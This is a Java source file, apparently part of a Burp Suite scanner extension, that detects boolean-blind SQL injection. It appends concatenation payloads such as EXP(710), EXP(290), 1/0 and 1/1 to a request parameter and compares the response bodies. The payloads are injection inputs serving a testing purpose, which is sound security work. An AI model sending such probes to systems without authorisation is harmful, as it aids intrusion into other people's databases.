package burp.injection;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.params.HttpParameter;
import burp.util.MyCompare;

public class BooleanBlindInjection extends AbstractInjectionStrategy {

    private final ThreadLocal<String> lastPayload = ThreadLocal.withInitial(() -> "");

    public BooleanBlindInjection(MontoyaApi api){super(api);}
    @Override public String getName(){return"Boolean-Blind";}
    @Override public String getVulnType(){return"boolsql";}
    @Override public String getPayload(){return lastPayload.get();}

    @Override
    public HttpRequestResponse execute(HttpRequest origReq, HttpRequestResponse baseRR,
                                         HttpParameter param, String baseBody){
        // Step 1: EXP(710) overflow
        lastPayload.set("'||EXP(710)||'");
        HttpRequest req1 = append(origReq, param, lastPayload.get());
        HttpRequestResponse rr1 = send(req1);
        if(rr1==null) return null;
        String body1 = body(rr1);
        if(MyCompare.similarity(baseBody, body1) >= sim()) return null;

        // Step 2: EXP(290) normal — 期望与 EXP(710) 不同（正常值 vs 溢出）
        lastPayload.set("'||EXP(290)||'");
        HttpRequest req2 = append(origReq, param, lastPayload.get());
        HttpRequestResponse rr2 = send(req2);
        if(rr2==null) return null;
        String body2 = body(rr2);

        double sim12 = MyCompare.levenshteinStripped(body1, body2, "EXP\\(710\\)", "EXP\\(290\\)");

        // If EXP(710) and EXP(290) produce similar responses (sim12 >= sim()),
        // both may just trigger the same generic error → try 1/0 fallback.
        boolean expRefOk = sim12 < sim();
        if (!expRefOk) {
            lastPayload.set("'||1/0||'");
            HttpRequestResponse rr2b = send(append(origReq, param, lastPayload.get()));
            if(rr2b != null) {
                String body2b = body(rr2b);
                if(MyCompare.similarity(baseBody, body2b) < sim()) {
                    // 1/0 triggered a difference → use it as reference for step 3
                    body2 = body2b;
                    expRefOk = true;
                }
            }
        }
        if (!expRefOk) return null; // no usable reference body

        // Step 3: 1/1 confirm — 必须同时满足两个条件：
        // (a) 与参考响应相似（说明 1/1 和 EXP/1/0 产生了相同效果）
        // (b) 与基线不同（说明确实改变了查询结果，不是通用校验错误）
        lastPayload.set("'||1/1||'");
        HttpRequest req3 = append(origReq, param, lastPayload.get());
        HttpRequestResponse rr3 = send(req3);
        if(rr3==null) return null;
        String body3 = body(rr3);

        double simBase3 = MyCompare.similarity(baseBody, body3);
        if (simBase3 >= sim()) return null; // 和基线一样 = 没注入

        double sim23 = MyCompare.levenshteinStripped(body2, body3, "EXP\\(290\\)|1/0", "1/1");
        return sim23 >= sim() ? rr3 : null;
    }
}
